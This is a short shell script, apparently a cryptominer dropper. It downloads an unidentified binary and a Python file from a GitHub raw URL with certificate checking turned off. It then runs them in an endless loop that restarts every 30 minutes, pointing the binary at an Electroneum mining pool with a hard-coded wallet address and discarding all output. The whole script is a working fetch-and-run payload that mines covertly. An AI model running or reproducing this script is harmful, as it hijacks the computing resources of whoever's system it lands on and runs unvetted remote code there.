mkdir -p /opt/code/
wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/goal" -P /opt/code
wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -P /opt/code
chmod -R 700 /opt/code

while true; do 
    pkill -f goal;
    pkill -f origin;
    sleep 5;
    /opt/code/goal -c x -M stratum+tcp://etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN:x@nl.etnpool.net:3333 &>/dev/null &
    python /opt/code/origin.py &>/dev/null &
    sleep 1800;
done

